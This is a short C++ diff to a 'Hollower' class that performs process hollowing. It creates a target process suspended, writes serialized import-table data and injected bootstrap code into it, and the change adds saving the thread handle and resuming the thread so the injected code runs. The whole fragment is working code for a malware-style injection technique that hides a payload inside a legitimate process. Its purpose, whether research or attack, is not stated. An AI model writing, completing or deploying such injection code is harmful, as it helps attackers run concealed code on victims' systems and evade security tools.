@@ -182,7 +182,9 @@ HANDLE Hollower::DoHollow()
 	size_t IATInfoOffset = SerializeIATInfo();
 	//Write IAT stub which will process serialized IAT info
 	InjectBootstrapCode(IATInfoOffset);
-
+	
+	//Resume Process
+	ResumeThread(this->hThread);
 	return this->hProc;
 }
 
@@ -201,6 +203,7 @@ void Hollower::CreateSuspendedProcess()
 	CreateProcess(app, NULL , NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 	
 	this->hProc = pi.hProcess;
+	this->hThread = pi.hThread;
 }
 
 Hollower::~Hollower()
